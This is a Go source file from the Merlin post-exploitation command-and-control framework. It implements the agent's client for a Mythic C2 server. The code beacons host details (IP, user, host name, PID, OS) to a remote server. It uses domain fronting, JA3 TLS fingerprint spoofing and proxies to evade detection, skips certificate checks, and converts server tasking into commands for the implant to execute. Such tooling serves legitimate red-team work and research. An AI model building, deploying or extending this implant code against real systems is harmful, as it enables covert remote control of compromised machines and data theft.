// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package mythic

import (
	// Standard
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"strconv"
	"strings"

	// 3rd Party
	"github.com/Ne0nd0g/ja3transport"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/net/http2"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/agent/clients"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// Client is a type of MerlinClient that is used to send and receive Merlin messages from the Merlin server
type Client struct {
	clients.MerlinClient
	Client     *http.Client // Client to send messages with
	Protocol   string
	URL        string            // URL to send messages to (e.g., https://127.0.0.1:443/test.php)
	Host       string            // HTTP Host header value
	Proxy      string            // Proxy string
	JWT        string            // JSON Web Token for authorization
	Headers    map[string]string // Additional HTTP headers to add to the request
	secret     []byte            // The secret key used to encrypt communications
	UserAgent  string            // HTTP User-Agent value
	PaddingMax int               // PaddingMax is the maximum size allowed for a randomly selected message padding length
	JA3        string            // JA3 is a string that represent how the TLS client should be configured, if applicable
	psk        string            // PSK is the Pre-Shared Key secret the agent will use to start authentication
	AgentID    uuid.UUID         // TODO can this be recovered through reflection since client is embedded into agent?
	MythicID   uuid.UUID
}

// Config is a structure that is used to pass in all necessary information to instantiate a new Client
type Config struct {
	AgentID     uuid.UUID // The Agent's UUID
	PayloadID   string    // The UUID used with the Mythic framework
	Protocol    string    // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
	Host        string    // Host is used with the HTTP Host header for Domain Fronting activities
	URL         string    // URL is the protocol, domain, and page that the agent will communicate with (e.g., https://google.com/test.aspx)
	Proxy       string    // Proxy is the URL of the proxy that all traffic needs to go through, if applicable
	UserAgent   string    // UserAgent is the HTTP User-Agent header string that Agent will use while sending traffic
	PSK         string    // PSK is the Pre-Shared Key secret the agent will use to start authentication
	JA3         string    // JA3 is a string that represent how the TLS client should be configured, if applicable
	Padding     string    // Padding is the max amount of data that will be randomly selected and appended to every message
	AuthPackage string    // AuthPackage is the type of authentication the agent should use when communicating with the server
	Opaque      []byte    // Opaque is the byte representation of the EnvU object used with the OPAQUE protocol (future use)
}

// New instantiates and returns a Client that is constructed from the passed in Config
func New(config Config) (*Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.New()...")
	client := Client{
		AgentID:   config.AgentID,
		URL:       config.URL,
		UserAgent: config.UserAgent,
		Host:      config.Host,
		Protocol:  config.Protocol,
		JA3:       config.JA3,
		psk:       config.PSK,
	}

	// Mythic: Add payload ID
	var err error
	client.MythicID, err = uuid.FromString(config.PayloadID)
	if err != nil {
		return &client, err
	}

	// Get the HTTP client
	client.Client, err = getClient(client.Protocol, client.Proxy, client.JA3)
	if err != nil {
		return &client, err
	}

	cli.Message(cli.INFO, "Client information:")
	cli.Message(cli.INFO, fmt.Sprintf("\tProtocol: %s", client.Protocol))
	cli.Message(cli.INFO, fmt.Sprintf("\tURL: %s", client.URL))
	cli.Message(cli.INFO, fmt.Sprintf("\tUser-Agent: %s", client.UserAgent))
	cli.Message(cli.INFO, fmt.Sprintf("\tHTTP Host Header: %s", client.Host))
	cli.Message(cli.INFO, fmt.Sprintf("\tPayload Padding Max: %d", client.PaddingMax))
	cli.Message(cli.INFO, fmt.Sprintf("\tJA3 String: %s", client.JA3))

	return &client, nil
}

func (client *Client) Auth(authType string, register bool) (messages.Base, error) {
	return messages.Base{}, nil
}

func (client *Client) SendMerlinMessage(m messages.Base) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.SendMerlinMessage()...")

	var err error
	var data []byte
	var returnMessage messages.Base

	switch m.Type {
	case messages.CHECKIN:
		// Marshal the structure to a JSON object
		data, err = json.Marshal(m.Payload.(CheckIn))
		if err != nil {
			return returnMessage, fmt.Errorf("there was an error marshalling the mythic.CheckIn structrong to JSON:\r\n%s", err)
		}
	}

	// Build Mythic data structure: <Payload UUID> <Base64 JSON>
	payload := client.MythicID.String() + " " + string(data)

	// Base64 encode the payload
	payload = base64.StdEncoding.EncodeToString([]byte(payload))

	// Build the request
	req, err := http.NewRequest("POST", client.URL, strings.NewReader(payload))
	if err != nil {
		return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", err)
	}

	// Add HTTP headers
	if req != nil {
		req.Header.Set("User-Agent", client.UserAgent)
		if client.Host != "" {
			req.Host = client.Host
		}
	}

	// Send the request
	cli.Message(cli.DEBUG, fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, client.URL))
	cli.Message(cli.DEBUG, fmt.Sprintf("HTTP Request:\r\n%+v", req))
	resp, err := client.Client.Do(req)
	if err != nil {
		return returnMessage, fmt.Errorf("there was an error sending a message to the server:\r\n%s", err)
	}

	// Process the response

	// Check the status code
	switch resp.StatusCode {
	case 200:
	default:
		return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
	}

	// Read the response body
	respData, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return returnMessage, fmt.Errorf("there was an error reading the HTTP payload response message:\r\n%s", err)
	}

	// Base64 decode the payload
	decodedPayload, err := base64.StdEncoding.DecodeString(string(respData))
	if err != nil {
		return returnMessage, fmt.Errorf("there was an error base64 decoding the HTTP payload response message:\r\n%s", err)
	}

	cli.Message(cli.DEBUG, fmt.Sprintf("Base64 decoded message:\r\n%s", decodedPayload))
	cli.Message(cli.DEBUG, fmt.Sprintf("JSON:\r\n%s", strings.Trim(string(decodedPayload), client.MythicID.String())))

	// Verify UUID matches
	if !strings.HasPrefix(string(decodedPayload), client.MythicID.String()) {
		return returnMessage,
			fmt.Errorf("response message agent ID %s does not match current ID %s",
				uuid.FromStringOrNil(string(decodedPayload[:len(client.MythicID)])), client.MythicID.String())
	}

	// Strip the Mythic UUID from the payload
	decodedPayload = bytes.TrimPrefix(decodedPayload, []byte(client.MythicID.String()))

	return messages.Base{}, nil
}

func (client *Client) Initial(agent messages.AgentInfo) error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Initial()...")

	// Build initial checkin message
	checkIn := CheckIn{
		Action:        "checkin",
		IP:            agent.SysInfo.Ips[0],
		OS:            agent.SysInfo.Platform,
		User:          agent.SysInfo.UserName,
		Host:          agent.SysInfo.HostName,
		PID:           strconv.Itoa(agent.SysInfo.Pid),
		PayloadID:     client.MythicID.String(),
		Arch:          agent.SysInfo.Architecture,
		Domain:        "",
		Integrity:     0,
		ExternalIP:    "",
		EncryptionKey: "",
		DecryptionKey: "",
	}

	base := messages.Base{
		ID:      client.AgentID,
		Type:    messages.CHECKIN,
		Payload: checkIn,
	}

	_, err := client.SendMerlinMessage(base)

	if err != nil {
		return err
	}

	return nil
}

func (client *Client) Set(key string, value string) error {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Set()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s, Value: %s", key, value))
	var err error
	switch strings.ToLower(key) {
	case "ja3":
		ja3String := strings.Trim(value, "\"'")
		client.Client, err = getClient(client.Protocol, client.Proxy, ja3String)
		if ja3String != "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Set agent JA3 signature to:%s", ja3String))
		} else if ja3String == "" {
			cli.Message(cli.NOTE, fmt.Sprintf("Setting agent client back to default using %s protocol", client.Protocol))
		}
		client.JA3 = ja3String
	default:
		err = fmt.Errorf("unknown mythic client setting: %s", key)
	}
	return err
}

func (client *Client) Get(key string) string {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.Get()...")
	cli.Message(cli.DEBUG, fmt.Sprintf("Key: %s", key))
	switch strings.ToLower(key) {
	case "ja3":
		return client.JA3
	case "protocol":
		return client.Protocol
	default:
		return fmt.Sprintf("unknown mythic client configuration setting: %s", key)
	}
}

// getClient returns a HTTP client for the passed protocol, proxy, and ja3 string
func getClient(protocol string, proxyURL string, ja3 string) (*http.Client, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.getClient()...")
	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	// Proxy
	var proxy func(*http.Request) (*url.URL, error)
	if proxyURL != "" {
		rawURL, errProxy := url.Parse(proxyURL)
		if errProxy != nil {
			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
		}
		proxy = http.ProxyURL(rawURL)
	}

	// JA3
	if ja3 != "" {
		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
		if errJA3 != nil {
			return nil, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
		}
		tr, err := ja3transport.NewTransportInsecure(ja3)
		if err != nil {
			return nil, err
		}

		// Set proxy
		if proxyURL != "" {
			tr.Proxy = proxy
		}

		JA3.Transport = tr

		return JA3.Client, nil
	}

	var transport http.RoundTripper
	switch strings.ToLower(protocol) {
	case "h2":
		transport = &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
	case "h2c":
		transport = &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		}
	case "https":
		if proxyURL != "" {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
				Proxy:           proxy,
			}
		} else {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
			}
		}
	case "http":
		if proxyURL != "" {
			transport = &http.Transport{
				MaxIdleConns: 10,
				Proxy:        proxy,
			}
		} else {
			transport = &http.Transport{
				MaxIdleConns: 10,
			}
		}
	default:
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
	return &http.Client{Transport: transport}, nil
}

func (client *Client) convertToMerlinMessage(data []byte) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.convertToMerlinMessage()...")
	// Determine the action
	var action string
	if bytes.Contains(data, []byte("\"action\":\"checkin\"")) {
		action = CHECKIN
	} else if bytes.Contains(data, []byte("\"action\":\"get_tasking\"")) {
		action = TASKING
	} else if bytes.Contains(data, []byte("\"action\":\"post_response\"")) {
		action = RESPONSE
	} else {
		return messages.Base{}, fmt.Errorf("message did not contain a known action:\r\n%s", data)
	}

	returnMessage := messages.Base{
		ID: client.AgentID,
	}

	switch action {
	case CHECKIN:
		var msg Response
		// Unmarshal the JSON message
		err := json.Unmarshal(data, &msg)
		if err != nil {
			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the JSON object in the message handler:\r\n%s", err)
		}
		if msg.Status == "success" {
			cli.Message(cli.SUCCESS, "initial checkin successful")
			client.MythicID = uuid.FromStringOrNil(msg.ID)
			return messages.Base{}, nil
		} else {
			return messages.Base{}, fmt.Errorf("unknown checkin action status:\r\n%+v", msg)
		}
	case TASKING:
		var msg Tasks
		// Unmarshal the JSON message
		err := json.Unmarshal(data, &msg)
		if err != nil {
			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the JSON object to mythic.Tasks in the message handler:\r\n%s", err)
		}
		if len(msg.Tasks) == 0 {
			returnMessage.Type = messages.IDLE
			return returnMessage, nil
		}
		if len(msg.Tasks) > 0 {
			cli.Message(cli.DEBUG, fmt.Sprintf("returned Mythic tasks:\r\n%+v", msg))
			return taskHandler(msg.Tasks)
		}
	case RESPONSE:
		var msg ServerPostResponse
		err := json.Unmarshal(data, &msg)
		if err != nil {
			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the JSON object to a mythic.ServerTaskResponse structure in the message handler:\r\n%s", err)
		}
		cli.Message(cli.NOTE, fmt.Sprintf("post_response results from the server: %+v", msg))
		return messages.Base{}, nil
	default:
		return messages.Base{}, fmt.Errorf("unknown Mythic action: %d", action)
	}
	return messages.Base{}, nil
}

// taskHandler is a function to convert tasks from the Mythic server into Merlin jobs
func taskHandler(tasks []Task) (messages.Base, error) {
	cli.Message(cli.DEBUG, "Entering into clients.mythic.taskHandler()")
	cli.Message(cli.DEBUG, fmt.Sprintf("Input task:\r\n%+v", tasks))

	// Merlin messages.Base structure
	base := messages.Base{
		Version: 1,
		Type:    messages.JOBS,
	}

	var returnJobs []jobs.Job

	for _, task := range tasks {
		var mythicJob Job
		var job jobs.Job
		err := json.Unmarshal([]byte(task.Params), &mythicJob)
		if err != nil {
			return messages.Base{}, fmt.Errorf("there was an error unmarshalling the Mythic task parameters to a mythic.Job:\r\n%s", err)
		}
		job.ID = task.ID
		job.Token = uuid.FromStringOrNil(task.ID)
		job.Type = mythicJob.Type

		cli.Message(cli.DEBUG, fmt.Sprintf("Switching on mythic.Job type %d", mythicJob.Type))

		switch mythicJob.Type {
		case jobs.CMD, jobs.CONTROL, jobs.NATIVE:
			var payload jobs.Command
			err := json.Unmarshal([]byte(mythicJob.Payload), &payload)
			if err != nil {
				return base, fmt.Errorf("there was an error unmarshalling the Mythic job payload to a jobs.CMD structure:\r\n%s", err)
			}
			cli.Message(cli.DEBUG, fmt.Sprintf("unmarshalled jobs.Command structure:\r\n%+v", payload))
			job.Payload = payload
			returnJobs = append(returnJobs, job)
		default:
			return base, fmt.Errorf("unknown mythic.job type: %d", mythicJob.Type)
		}
	}

	// Add the list of jobs to the messagebase
	base.Payload = returnJobs

	return base, nil
}
